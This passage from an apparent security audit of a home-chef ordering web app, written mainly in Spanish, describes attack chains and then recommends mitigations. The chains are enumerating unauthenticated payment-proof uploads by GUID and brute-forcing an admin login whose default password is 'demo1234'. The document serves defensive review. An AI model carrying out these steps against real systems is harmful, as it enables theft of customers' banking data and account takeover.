**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application) → T1078 (Valid Accounts) → potencial T1059 (Command Execution).

**Mitigation:** F-01 + F-03 fix.

---

### Chain CH-2 — Comprobantes filtrados via /uploads + log central

**Goal:** robar comprobantes de pago de clientes del chef.

**Pre-conditions:** F-02 (uploads sin auth) + cualquier filtración del filename Guid (logs de Serilog que incluyan response bodies, screenshot de cliente que reenvió URL, accidental commit de log file).

**Steps:**
1. Atacante consigue al menos un GUID de comprobante (por la vía que sea).
2. `GET /uploads/payment-proofs/<guid>` → 200 con la imagen.
3. Si los GUIDs comparten timestamp prefix porque el sort en BD es predecible, atacante itera GUIDs cercanos.
4. Acumula 100+ comprobantes con datos bancarios.
5. Publica thread en X. Reputación destruida.

**MITRE ATT&CK:** T1213 (Data from Information Repositories).

**Mitigation:** F-02 fix (no servir static, autorización per-resource).

---

### Chain CH-3 — Account takeover de admin via brute force + bootstrap default

**Goal:** controlar la cuenta admin del chef piloto.

**Pre-conditions:** F-04 (sin rate limit) + F-07 (bootstrap admin default) + el chef no cambió la password antes de exponer a internet (premortem #4 dice que el deploy real nunca se ejecutó).

**Steps:**
1. Tras el deploy, atacante hace `POST /api/auth/login` con `admin@homechef.local` y dictionary del top-100 passwords.
2. `demo1234` está en la lista. Acierta en < 100 intentos.
3. Sin lockout ni rate limit (F-04), no hay alerta.
4. Atacante ahora es admin. Aprueba pagos falsos, descarga comprobantes (F-02), exfiltra datos.

**MITRE ATT&CK:** T1110.001 (Password Guessing) → T1078.

**Mitigation:** F-04 + F-07 + F-17 (MFA).

## 5. Secure design recommendations

### Architectural improvements

1. **Mover toda la authorización de `/uploads/*` adentro de la API** (F-02). Considerar un dominio cookieless para uploads en el futuro.
2. **Separar configuración de entornos** en `docker-compose.{dev,staging,prod}.yml` con `ASPNETCORE_ENVIRONMENT` explícito por archivo (F-01).
3. **Centralizar política de secretos**: ningún secreto en `appsettings*.json`; siempre env var con validación de no-default al startup (F-03, F-06).
4. **Default deny en CORS**: si no hay `AllowedOrigins`, fallar startup (F-14).
5. **Defense in depth de uploads**: 7 capas (extension allowlist + content-type + magic bytes + format parser re-encode + size limit + filename sanitization + GUID storage + serving con `nosniff` + auth gate). Actualmente solo 3.
6. **MFA mandatory para roles Admin/Cashier** (F-17). Implementar antes del piloto si manejan dinero.

### Safer patterns

- Reemplazar `app.UseStaticFiles({ RequestPath: "/uploads" })` con un endpoint autenticado que sirve archivos via `Results.File(...)`.
- Reemplazar derivación de extensión del Content-Type del request con derivación del formato detectado tras re-encode.
- Agregar `[StartupValidation]` que verifique al boot:
  - `JWT:SigningKey` no es placeholder.
  - `BOOTSTRAP_ADMIN_PASSWORD` cumple policy si está set.
  - `DeliveryWebhooks.Secrets` no contienen vacíos cuando `RejectInvalidSignature: true`.
  - `Cors.AllowedOrigins` no está vacío en non-Development.
  - `ConnectionStrings.PostgreSQL` no contiene `homechef_dev` literal en non-Development.

### Best practices to adopt

- **CI checks de seguridad**:
  - `dotnet list package --vulnerable --include-transitive` (falla si Critical/High).
  - `gitleaks detect` para secret scanning en cada PR.
  - `dotnet format` + analyzers Microsoft.CodeAnalysis.NetAnalyzers + SecurityCodeScan.
- **Branch protection** en `main`: signed commits, required reviewers, status checks bloqueantes.
- **Threat modeling cadence**: cada feature nueva pasa STRIDE de 30 min antes de merge.
- **ASVS gap tracker**: planilla con los ~350 requirements de ASVS 5.0 marcados como met / partial / gap, revisada cada audit.
